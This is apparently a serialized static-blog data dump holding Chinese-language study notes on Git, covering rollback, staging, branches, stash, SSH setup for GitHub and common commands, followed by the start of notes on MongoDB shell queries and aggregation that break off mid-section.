title=\"版本的回退\"></a>版本的回退</h4><blockquote>\n<p>   有一个指针HEAD指向最新的版本， 上一个版本可以被表示为</p>\n</blockquote>\n<blockquote>\n<p>HEAD^,一个^表示前一个版本，100个^表示第前100个版本,还可以表示为:HEAD<del>1,HEAD</del>100,分别表示前一个和前100个版本</p>\n</blockquote>\n<blockquote>\n<p>版本回退命令</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> reset –hard HEAD~1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<blockquote>\n<p>版本前进命令</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> reset –hard 版本编号 <span class=\"token comment\">#（commit) 版本编号可以通过git reflog来查看，这里面都是操作记录</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"工作区\"><a href=\"#工作区\" class=\"headerlink\" title=\"工作区\"></a>工作区</h3><p>就是使用git init命令的目录，创建文件和编辑文件都是在工作区完成的<br>版本库:拥有暂存区,HEAD区</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span> <span class=\"token comment\"># 就是添加修改到暂存区,git commit就是创建版本</span>\n\n<span class=\"token function\">git</span> status <span class=\"token comment\"># 可以查看工作区的情况</span>\n\n<span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token comment\"># 可以同时添加很多个文件（也可以是目录）到暂存区，用空格分别，并且使用git commit的时候可以将同时提交的所有文件，创建一个版本，</span>\n\n<span class=\"token function\">git</span> checkout – 文件名 <span class=\"token comment\"># 在没有加到暂存区可以直接用这个命令丢弃修改(删除以后也可用这个恢复)，如果已经加到了暂存区，可以通过git reset HEAD 文件名解除添加到暂存区，然后用这个命令直接放弃修改</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"删除文件\"><a href=\"#删除文件\" class=\"headerlink\" title=\"删除文件\"></a>删除文件</h4><p>rm 文件名,因为是对工作区的文件的修改，所以可以用git checkout恢复，也可以用git rm将删除放入暂存区，彻底删除。</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">第一步：使用rm\n第二步：如果要恢复,git checkout --文件名,如果要删除，git rm放入暂存区\n第三步: 如果删除文件的修改被放入了暂存区，可以用git reset HEAD 文件名 解除暂存，然后用git checkout恢复<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"git-分支的概念-比如两个平行的宇宙，出现了交点\"><a href=\"#git-分支的概念-比如两个平行的宇宙，出现了交点\" class=\"headerlink\" title=\"git 分支的概念(比如两个平行的宇宙，出现了交点)\"></a>git 分支的概念(比如两个平行的宇宙，出现了交点)</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">git主分支:master分支,HEAD指向master然后master再指向提交的指针\ngit从分支:dev分支，和master分支相互独立，可以和master分支合并，还可以删除\n\n<span class=\"token function\">git</span> branch可以查看有多少个分支\n创建分支: <span class=\"token function\">git</span> branch 名字\n创建新的分支并切换到新分支: <span class=\"token function\">git</span> checkout <span class=\"token parameter variable\">-b</span> dev（名字随便取）,创建了dev分支，HEAD就会指向dev\n切换到master分支: <span class=\"token function\">git</span> checkout master\n将dev分支的东西合并到master（一般都是合并在master分支上，也可以合并到其他的相关分支上，比如修复hug的时候）：git merge dev\n删除dev分支：git branch <span class=\"token parameter variable\">-d</span> dev<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote>\n<p> 分支合并冲突:master分支和其他分支都修改了同一个文件的版本，合并就会报错，解决办法就是手动解决 </p>\n</blockquote>\n<blockquote>\n<p> 分支的管理决策: 在两个分支中修改了不同的文件的版本，那么合并的时候，就不会是快速合并,而是跳出一个弹框,第一行写入你的说明信息，退出之后合并完成，或者git merge –no-ff -m 合并版本说明 合并的分支， 这样可以禁用快速合并，保留分支的文件信息</p>\n</blockquote>\n<blockquote>\n<p> 分支bug管理:当我们在一个分支上进行工作的时候，其他的分支有bug需要及时的修复，那么可以使用git stash保存正在工作的分支上的状态，然后马上去需要修复bug的分支上修复bug：</p>\n</blockquote>\n<ul>\n<li>   首先我们要确定在哪一个分支上修复bug </li>\n<li>   然后在到那个分支上创建一个临时的分支来修复这个bug </li>\n<li>   然后切换回出hug的分支</li>\n<li>   然后合并分支，并用 git merge –no-ff -m ‘说明信息’ 临时分支,用来保存bug记录</li>\n<li>   然后删除临时分支，在修复完成以后,再回到最初工作的分支</li>\n<li>   用git stash pop恢复工作现场就可以继续工作（用git stash list 可以查看保存的工作现场的列表)</li>\n</ul>\n<h4 id=\"链接远程的仓库\"><a href=\"#链接远程的仓库\" class=\"headerlink\" title=\"链接远程的仓库\"></a>链接远程的仓库</h4><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">生成ssh公钥:ssh-keygen -t rsa -C'749062870@qq.com'一直回车(3个)\n\n生成的ssh存放在用户文件夹下面的.ssh下面\n\n将.ssh下面的id_rsa.pub内容复制到github\n\n使用ssh -T git@github.com来测试是否连通<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h4 id=\"GitHub：\"><a href=\"#GitHub：\" class=\"headerlink\" title=\"GitHub：\"></a>GitHub：</h4><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">1、创建新的仓库(同git中的git init): start project  => 项目名称 => 公开 => 两个add(readme使用说明，gitignore忽略文件)\n2、添加ssh账户(本机和github交互):创好仓库之后，点击头像下拉，找到settings => SSH and GPG keys => New SSH key就可以添加本地ssh账户，Title随便写,Key则需要本地的ssh公钥，（生成本地电脑的ssh公钥，回到家目录，编辑vim .gitconfig,然后ssh-keygen -t rsa -C '749062870@qq.com'一直回车，完成之后，cd ssh，然后cat id_rsa.pub，复制过去就行了）\n3、克隆项目:github中的仓库中，code下拉中，选择ssh(我们用的就是ssh)，复制地址到相对应的文件夹下用终端 git clone 复制的地址, 将github中的项目下载到本地\n4、推送代码:被下载到本地的项目,不用master分支开发，而是创建一个自己的分支，一直在自己的分支上开发，开发完成之后先add，commit到本地，然后可以用git push origin 分支名称，就可以推送到github上面\n5、追踪远程分支：git branch --set-upstream-to=origin/远程分支 本地分支,追踪之后，就可以用git status来查看本地分支和远程分支的提交情况\n6、拉去代码: git pull origin 要拉取的分支.从远程分支上下载，拉取代码\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>链接——&gt;切换分支–&gt;add—&gt;commit—-&gt;push到lqs</p>\n</blockquote>\n<h5 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h5><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> user.name <span class=\"token string\">'用户名'</span> <span class=\"token comment\"># 修改配置的用户名</span>\n<span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> user.email <span class=\"token string\">'邮箱'</span>  <span class=\"token comment\"># 修改配置的邮箱</span>\n\n<span class=\"token function\">git</span> init <span class=\"token comment\"># 初始化git仓库</span>\n<span class=\"token function\">git</span> status <span class=\"token comment\"># 查看工作区的文件是否被管理</span>\n<span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span> <span class=\"token comment\"># 把工作区的文件提交到暂存区，也就是将工作区的文件进行管理</span>\n<span class=\"token function\">git</span> commit <span class=\"token parameter variable\">-m</span> <span class=\"token string\">'日志'</span> <span class=\"token comment\"># 将暂存区的文件提交到本地仓库</span>\n<span class=\"token function\">git</span> log <span class=\"token comment\"># 查看提交的日志，点击q退出</span>\n<span class=\"token function\">git</span> branch <span class=\"token comment\"># 查看本地分支</span>\n<span class=\"token function\">git</span> branch <span class=\"token parameter variable\">-a</span> <span class=\"token comment\"># 查看本地和远程的分支</span>\n<span class=\"token function\">git</span> checkout <span class=\"token string\">'远程分支'</span> <span class=\"token comment\"># 可以从本地分支切换到远程分支</span>\n<span class=\"token function\">git</span> checkout <span class=\"token parameter variable\">-b</span> <span class=\"token string\">'分支名称'</span> <span class=\"token comment\"># 新建并切换到分支</span>\n<span class=\"token function\">git</span> branch <span class=\"token parameter variable\">-d</span> <span class=\"token string\">'分支名称'</span> <span class=\"token comment\"># 删除分支，分支被合并之后才允许删除</span>\n<span class=\"token function\">git</span> branch <span class=\"token parameter variable\">-D</span> <span class=\"token string\">'分支名称'</span> <span class=\"token comment\"># 删除分支，强制删除</span>\n<span class=\"token function\">git</span> merge <span class=\"token string\">'分支名称'</span> <span class=\"token comment\"># 合并分支</span>\n<span class=\"token function\">git</span> push <span class=\"token string\">'远程地址 '</span><span class=\"token comment\"># 将本地仓库推送到远程仓库或者如下</span>\n<span class=\"token function\">git</span> remote <span class=\"token function\">add</span> origin <span class=\"token string\">'远程地址'</span> <span class=\"token comment\"># 给远程仓库添加别名</span>\n<span class=\"token function\">git</span> push <span class=\"token parameter variable\">-u</span> origin <span class=\"token string\">'分支名称'</span> <span class=\"token comment\"># 远程仓库没有这个分支，第一次向远程仓库推送分支</span>\n<span class=\"token function\">git</span> push  <span class=\"token comment\"># 第二次推送</span>\n<span class=\"token function\">git</span> clone <span class=\"token string\">'远程地址'</span> <span class=\"token comment\"># 克隆远程仓库的代码</span>\n<span class=\"token function\">git</span> pull <span class=\"token string\">'远程地址'</span> <span class=\"token string\">'远程分支'</span> <span class=\"token comment\"># 拉去远程仓库的代码</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Git（文件只有放入了暂存区之后才会被追踪）\"><a href=\"#Git（文件只有放入了暂存区之后才会被追踪）\" class=\"headerlink\" title=\"Git（文件只有放入了暂存区之后才会被追踪）\"></a>Git（文件只有放入了暂存区之后才会被追踪）</h2><h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><ul>\n<li>   版本控制:解决多人同时开发的代码问题，解决找回历史代码的问题</li>\n<li>   分布式:Git是分布式版本控制系统，如同一个GIT仓库，可以分不到不同的机器上，工作原理:找一台电脑做服务器（中央服务器），不关机，其他的人可以把这个服务器克隆到自己的电脑上</li>\n</ul>\n<h3 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"安装Git\"></a>安装Git</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> <span class=\"token function\">git</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"创建版本库\"><a href=\"#创建版本库\" class=\"headerlink\" title=\"创建版本库\"></a>创建版本库</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> init<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"创建版本-两步\"><a href=\"#创建版本-两步\" class=\"headerlink\" title=\"创建版本(两步)\"></a>创建版本(两步)</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> <span class=\"token function\">add</span> 文件\n\n<span class=\"token function\">git</span> commit <span class=\"token parameter variable\">-m</span> ‘版本说明’ <span class=\"token comment\"># 版本:第一次创建版本的时候是记录里面的内容，以后的版本都是保存被修改的信息</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"查询版本记录信息\"><a href=\"#查询版本记录信息\" class=\"headerlink\" title=\"查询版本记录信息\"></a>查询版本记录信息</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> log\n\n<span class=\"token function\">git</span> log <span class=\"token parameter variable\">--pretty</span><span class=\"token operator\">=</span>oneline <span class=\"token comment\"># 更好用</span>\n\n<span class=\"token function\">git</span> log <span class=\"token parameter variable\">--graph</span> <span class=\"token parameter variable\">--pretty</span><span class=\"token operator\">=</span>oneline <span class=\"token comment\"># 可以查看分支图</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"版本的回退\"><a href=\"#版本的回退\" class=\"headerlink\" title=\"版本的回退\"></a>版本的回退</h4><blockquote>\n<p>   有一个指针HEAD指向最新的版本， 上一个版本可以被表示为</p>\n</blockquote>\n<blockquote>\n<p>HEAD^,一个^表示前一个版本，100个^表示第前100个版本,还可以表示为:HEAD<del>1,HEAD</del>100,分别表示前一个和前100个版本</p>\n</blockquote>\n<blockquote>\n<p>版本回退命令</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> reset –hard HEAD~1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<blockquote>\n<p>版本前进命令</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> reset –hard 版本编号 <span class=\"token comment\">#（commit) 版本编号可以通过git reflog来查看，这里面都是操作记录</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"工作区\"><a href=\"#工作区\" class=\"headerlink\" title=\"工作区\"></a>工作区</h3><p>就是使用git init命令的目录，创建文件和编辑文件都是在工作区完成的<br>版本库:拥有暂存区,HEAD区</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span> <span class=\"token comment\"># 就是添加修改到暂存区,git commit就是创建版本</span>\n\n<span class=\"token function\">git</span> status <span class=\"token comment\"># 可以查看工作区的情况</span>\n\n<span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token comment\"># 可以同时添加很多个文件（也可以是目录）到暂存区，用空格分别，并且使用git commit的时候可以将同时提交的所有文件，创建一个版本，</span>\n\n<span class=\"token function\">git</span> checkout – 文件名 <span class=\"token comment\"># 在没有加到暂存区可以直接用这个命令丢弃修改(删除以后也可用这个恢复)，如果已经加到了暂存区，可以通过git reset HEAD 文件名解除添加到暂存区，然后用这个命令直接放弃修改</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"删除文件\"><a href=\"#删除文件\" class=\"headerlink\" title=\"删除文件\"></a>删除文件</h4><p>rm 文件名,因为是对工作区的文件的修改，所以可以用git checkout恢复，也可以用git rm将删除放入暂存区，彻底删除。</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">第一步：使用rm\n第二步：如果要恢复,git checkout --文件名,如果要删除，git rm放入暂存区\n第三步: 如果删除文件的修改被放入了暂存区，可以用git reset HEAD 文件名 解除暂存，然后用git checkout恢复<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"git-分支的概念-比如两个平行的宇宙，出现了交点\"><a href=\"#git-分支的概念-比如两个平行的宇宙，出现了交点\" class=\"headerlink\" title=\"git 分支的概念(比如两个平行的宇宙，出现了交点)\"></a>git 分支的概念(比如两个平行的宇宙，出现了交点)</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">git主分支:master分支,HEAD指向master然后master再指向提交的指针\ngit从分支:dev分支，和master分支相互独立，可以和master分支合并，还可以删除\n\n<span class=\"token function\">git</span> branch可以查看有多少个分支\n创建分支: <span class=\"token function\">git</span> branch 名字\n创建新的分支并切换到新分支: <span class=\"token function\">git</span> checkout <span class=\"token parameter variable\">-b</span> dev（名字随便取）,创建了dev分支，HEAD就会指向dev\n切换到master分支: <span class=\"token function\">git</span> checkout master\n将dev分支的东西合并到master（一般都是合并在master分支上，也可以合并到其他的相关分支上，比如修复hug的时候）：git merge dev\n删除dev分支：git branch <span class=\"token parameter variable\">-d</span> dev<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote>\n<p> 分支合并冲突:master分支和其他分支都修改了同一个文件的版本，合并就会报错，解决办法就是手动解决 </p>\n</blockquote>\n<blockquote>\n<p> 分支的管理决策: 在两个分支中修改了不同的文件的版本，那么合并的时候，就不会是快速合并,而是跳出一个弹框,第一行写入你的说明信息，退出之后合并完成，或者git merge –no-ff -m 合并版本说明 合并的分支， 这样可以禁用快速合并，保留分支的文件信息</p>\n</blockquote>\n<blockquote>\n<p> 分支bug管理:当我们在一个分支上进行工作的时候，其他的分支有bug需要及时的修复，那么可以使用git stash保存正在工作的分支上的状态，然后马上去需要修复bug的分支上修复bug：</p>\n</blockquote>\n<ul>\n<li>   首先我们要确定在哪一个分支上修复bug </li>\n<li>   然后在到那个分支上创建一个临时的分支来修复这个bug </li>\n<li>   然后切换回出hug的分支</li>\n<li>   然后合并分支，并用 git merge –no-ff -m ‘说明信息’ 临时分支,用来保存bug记录</li>\n<li>   然后删除临时分支，在修复完成以后,再回到最初工作的分支</li>\n<li>   用git stash pop恢复工作现场就可以继续工作（用git stash list 可以查看保存的工作现场的列表)</li>\n</ul>\n<h4 id=\"链接远程的仓库\"><a href=\"#链接远程的仓库\" class=\"headerlink\" title=\"链接远程的仓库\"></a>链接远程的仓库</h4><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">生成ssh公钥:ssh-keygen -t rsa -C'749062870@qq.com'一直回车(3个)\n\n生成的ssh存放在用户文件夹下面的.ssh下面\n\n将.ssh下面的id_rsa.pub内容复制到github\n\n使用ssh -T git@github.com来测试是否连通<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h4 id=\"GitHub：\"><a href=\"#GitHub：\" class=\"headerlink\" title=\"GitHub：\"></a>GitHub：</h4><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">1、创建新的仓库(同git中的git init): start project  => 项目名称 => 公开 => 两个add(readme使用说明，gitignore忽略文件)\n2、添加ssh账户(本机和github交互):创好仓库之后，点击头像下拉，找到settings => SSH and GPG keys => New SSH key就可以添加本地ssh账户，Title随便写,Key则需要本地的ssh公钥，（生成本地电脑的ssh公钥，回到家目录，编辑vim .gitconfig,然后ssh-keygen -t rsa -C '749062870@qq.com'一直回车，完成之后，cd ssh，然后cat id_rsa.pub，复制过去就行了）\n3、克隆项目:github中的仓库中，code下拉中，选择ssh(我们用的就是ssh)，复制地址到相对应的文件夹下用终端 git clone 复制的地址, 将github中的项目下载到本地\n4、推送代码:被下载到本地的项目,不用master分支开发，而是创建一个自己的分支，一直在自己的分支上开发，开发完成之后先add，commit到本地，然后可以用git push origin 分支名称，就可以推送到github上面\n5、追踪远程分支：git branch --set-upstream-to=origin/远程分支 本地分支,追踪之后，就可以用git status来查看本地分支和远程分支的提交情况\n6、拉去代码: git pull origin 要拉取的分支.从远程分支上下载，拉取代码\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>链接——&gt;切换分支–&gt;add—&gt;commit—-&gt;push到lqs</p>\n</blockquote>\n<h5 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h5><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> user.name <span class=\"token string\">'用户名'</span> <span class=\"token comment\"># 修改配置的用户名</span>\n<span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> user.email <span class=\"token string\">'邮箱'</span>  <span class=\"token comment\"># 修改配置的邮箱</span>\n\n<span class=\"token function\">git</span> init <span class=\"token comment\"># 初始化git仓库</span>\n<span class=\"token function\">git</span> status <span class=\"token comment\"># 查看工作区的文件是否被管理</span>\n<span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span> <span class=\"token comment\"># 把工作区的文件提交到暂存区，也就是将工作区的文件进行管理</span>\n<span class=\"token function\">git</span> commit <span class=\"token parameter variable\">-m</span> <span class=\"token string\">'日志'</span> <span class=\"token comment\"># 将暂存区的文件提交到本地仓库</span>\n<span class=\"token function\">git</span> log <span class=\"token comment\"># 查看提交的日志，点击q退出</span>\n<span class=\"token function\">git</span> branch <span class=\"token comment\"># 查看本地分支</span>\n<span class=\"token function\">git</span> branch <span class=\"token parameter variable\">-a</span> <span class=\"token comment\"># 查看本地和远程的分支</span>\n<span class=\"token function\">git</span> checkout <span class=\"token string\">'远程分支'</span> <span class=\"token comment\"># 可以从本地分支切换到远程分支</span>\n<span class=\"token function\">git</span> checkout <span class=\"token parameter variable\">-b</span> <span class=\"token string\">'分支名称'</span> <span class=\"token comment\"># 新建并切换到分支</span>\n<span class=\"token function\">git</span> branch <span class=\"token parameter variable\">-d</span> <span class=\"token string\">'分支名称'</span> <span class=\"token comment\"># 删除分支，分支被合并之后才允许删除</span>\n<span class=\"token function\">git</span> branch <span class=\"token parameter variable\">-D</span> <span class=\"token string\">'分支名称'</span> <span class=\"token comment\"># 删除分支，强制删除</span>\n<span class=\"token function\">git</span> merge <span class=\"token string\">'分支名称'</span> <span class=\"token comment\"># 合并分支</span>\n<span class=\"token function\">git</span> push <span class=\"token string\">'远程地址 '</span><span class=\"token comment\"># 将本地仓库推送到远程仓库或者如下</span>\n<span class=\"token function\">git</span> remote <span class=\"token function\">add</span> origin <span class=\"token string\">'远程地址'</span> <span class=\"token comment\"># 给远程仓库添加别名</span>\n<span class=\"token function\">git</span> push <span class=\"token parameter variable\">-u</span> origin <span class=\"token string\">'分支名称'</span> <span class=\"token comment\"># 远程仓库没有这个分支，第一次向远程仓库推送分支</span>\n<span class=\"token function\">git</span> push  <span class=\"token comment\"># 第二次推送</span>\n<span class=\"token function\">git</span> clone <span class=\"token string\">'远程地址'</span> <span class=\"token comment\"># 克隆远程仓库的代码</span>\n<span class=\"token function\">git</span> pull <span class=\"token string\">'远程地址'</span> <span class=\"token string\">'远程分支'</span> <span class=\"token comment\"># 拉去远程仓库的代码</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"mongoDB使用","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T08:39:14.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"MongoDB基础","_content":"# Mongodb\n\n> - 全局说明:文档=字典=map=dict=json \n> \n> - $是mongodb的专用字符\n\n## 安装\n```shell\nsudo apt-get install -y mongodb-org\n```\n## 启动(服务器):\n```shell\nsudo service mongod start\nsudo service mongod stop\nsudo service mongod restart\n```\n## 启动客户端\n```shell\nmongo\n```\n\n\n\n##    服务环境:\n```text\nmongod://localhost:27017\nredis://localhost:6379\nmysql://localhost:3306\nnginx://localhost:8888\ntomcat://localhost:8080\nflask://localhost:5000\ndjango://localhost:8000\n```\n\n\n## mongodb的命令\n```text\nshow dbs: 查看有哪些数据库\nshow database: 查看有哪些数据库\nuse 数据库: 切换到某个数据库,如果没有,直接创建(如果被使用的数据库是没有的,那么也是可以用的,因为mongodb是会自动创建的,但是,如果在创建完成之后没有存入任何数据,那么这个表用完之后,也不会保存)\ndb: 查看当前数据库(代表当前数据库)\ndb.dropDatabase(): 删除当前使用的数据库\n\nmongodb没有表的概念 数据都存储在集合当中\n\n集合也是不需要自己创建的,可以在存入数据的时候,mongodb自动创建集合\n\n也可以手动创建集合\ndb.createCollection(name, options): name 是被创建的这个集合的名字,options是这个集合的一些属性约束,用一个字典来设置\ndb.createCollection(\"userinfo\",{capped:true, size:10}):表示的就是,创建一个叫做userinfo的集合,capped表示限制,默认false,无上限,size是在capped为true的时候设置,表示数据超过10字节的时候,就会被新的数据覆盖,把之前的数据往外挤\n\nshow cllections: 查看所有的集合\ndb.集合名.drop(): 删除给定的集合\ndb.集合名: 使用指定的集合\ndb.集合名.find(): 查询指定的集合中的数据\ndb.集合名.insert({\"name\": \"lqs\",\"age\":\"12\"}): 往指定的集合插入数据\n\n这是一个Object类型(文档类型,字典),那么他会自动生成一个_id:ObjectId(\"xxxxxxx\"),保证文档的唯一性\n```\n### 添加数据\n```text\ndb.集合名.insert({})\ndb.集合名.save({})\n两者的区别:\n    insert()的方式来添加数据的时候,是绝对添加,如果添加一个_id已经存在的数据,那么它会直接报错,说,如果添加一个_id已经存在\n    save()的方式来添加数据的时候,是相对添加,如果添加一个_id不存在的数据,就和insert()方法一样,如果添加一个_id已经存在的数据,那么就是替换这个数据\n```\n###    文档插入\n```text\ndb.集合名.insert({_id:value,key:\"value\",key:\"value\",...}): key是可以不用引起来,也可以引起,value根据具体数数据类型,字符串就引起,数字就不引起,_id如果自己不设置,系统就会自动生成\n```\n### 查询数据\n```text\n美化查询:db.集合名.find().pretty():\n\ndb.集合名.find(): 查给定集合的所有数据\n\ndb.集合名.find(条件 根据这个条件查出对应的数据 字典格式, 返回的字段): 查询出给定集合里满足条件的所有数据\ndb.集合名.findOne(条件 根据这个条件查出对应的数据 字典格式): 查询出给定集合里满足条件的一条数据\n\n比较运算符\n    $lt: 小于\n    $lte: 小于等于\n    $gt: 大于\n    $gte: 大于等于\n    $ne: 不等\n使用例子:\n    db.collection.find({age:{$lt:18}}):查询出collection集合中的年龄小于18的所有数据\n\n\n范围运算符:\n    $in: 范围是指定的范围给在数组中\n    $nin: 不在指定的范围的\n使用例子:\n    db.collection.find({age:{$in:[12,45,23]}}):查询出collection集合中的年龄是12,23,45的人\n\n\n逻辑运算符:\n    与: 没有直接的运算符,直接写\n\n    $or       逻辑或\n    $and      逻辑与\n    $not      逻辑非\n    $nor      逻辑or的取反\n    $exists   存在逻辑\n    $type     查询键的数据类型\n使用例子:\n    db.collection.find({$or:[{age:{$lt:18}},{name:\"sc\"}]}):查询出collection中的年龄小于18或者名字等于sc的\n\n\n正则:\n    用/正则表达式/或者$regex:\"正则表达式\"编写正则表达式\n使用例子:\n    db.collection.find({name:/^abc/}):查询名字是abc开头的\n    db.collection.find({name:{$regex:\"123$\"}}):查询名字是123结尾的\n\n\nlimit和skip:\n    limit: 选中多少个\n    skip: 跳过多少个\n    配合使用的时候,先skip再limit\n使用例子:\n    db.collection.find().skip(2).limit(2):跳过两个再选中两个\n\n\n自定义查询(写js):\n    db.collection.find({$where:function(){return this.age>30}})\n    where可以执行一个函数,this就是表示当前collection中的数据,一条一条的来过this,类似于遍历\n```\n\n\n#### 查询之后返回字段的过滤\n```text\ndb.collection.find({条件},{name:1,_id:0 参数就是返回的字段,1为返回,不写不返回,除了_id,如果不想返回_id,那么_id:0})\n```\n#### 排序\n```\ndb.collection.find().sort({排序字段:1, 排序字段:-1}): sort表示排序,1为升序,-1为降序\n```\n#### 统计个数\n```\ndb.collection.find({条件}).count()\ndb.collection.count({条件})\n```\n\n#### 去重\n```\ndb.collection.distinct(\"字段名字\",{条件}): 返回的是一个列表,列表里面是不重复的\n```\n#### 聚合查询\n```\n管道:上层的结果给下层用\n$sum:总和,统计个数,$sum:1,以一倍计数\n$avg:平均\n$min:最小值\n$max:最大值\n$push:结果文档插入到一个数组中，\n$addToSet:结果文档插入到一个数组中,但不创建副本\n$first:根据资源文档排序获取第一个文档数据,\n$last:根据资源文档排序获取最后一个文档数据,\n$limit:显示多少个\n$skip:跳过多少个\n$sort:排序\n$project:修改输入文档的结构,如重命名\\添加\\删除字段,创建计算结果\n$unwind:将数组类型的字段进行拆分\n\n$match:相当于mysql中where\n$group:相当于mysql中group by\n\ndb.collection.aggregate(pipeline, options):语法:pipeline,管道,必须是一个数组\n格式:db.collection.aggregate([{管道:{表达式}},{管道:{表达式}}])\n\n管道中使用字段:\n    不加$:在明确的条件中字段不用加$如{name:\"lqs\"}:这种表示name是lqs,冒号前面不加\n    加$:在不明确的使用值的时候加$如{name2:$name}:这种表示获取name的值,冒号后面加\n\n例子:\n    db.collection.aggregate([{$match:{name:\"lqs\"}}]):查出名字是lqs的\n    db.collection.aggregate([{$match:{_id:{\"$gt\":2}}},{$group:{_id:$name,aavg:{$avg:$salary}}}]):查出_id大于2的所有数据,在上面查出的数据中,再按照name分组,求出salary的平均,_id表示分组字段的key,分组字段必须加上$,在这里面出现的变量多用$修饰,aavg是别名这种有多个操作的,都是衔接的,必须下面能用\n    db.collection.aggregate([{$group:{_id:$name,maxM:{$max:$salary},minM:{$min:$salary}}}]):分组查出最大最小\n    db.collection.aggregate([{$group:{_id:$sex,count:{$sum:1}}}]):分组统计男女生的总个数\n    